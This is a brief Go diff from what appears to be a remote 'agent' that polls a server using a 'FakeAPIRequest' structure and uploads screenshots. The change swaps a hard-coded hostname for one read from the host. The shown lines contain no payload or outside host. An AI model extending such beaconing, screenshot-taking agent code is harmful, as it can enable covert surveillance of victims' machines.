@@ -170,8 +170,10 @@ func main() {
 	}
 	client := &http.Client{Timeout: 30 * time.Second, Transport: tr} // 截图上传需要时间，增加超时
 
-	// 这里的 Hostname 后面加上 -v2 方便你区分新版 Agent
-	hostname := "agent-win11-v2" 
+	//获取主机名
+	hostname := getHostname()
+
+	//fmt.Printf("[*] Agent ID: %s\n", hostname)
 
 	for {
 		reqData := FakeAPIRequest{Hostname: hostname, Status: "idle"}
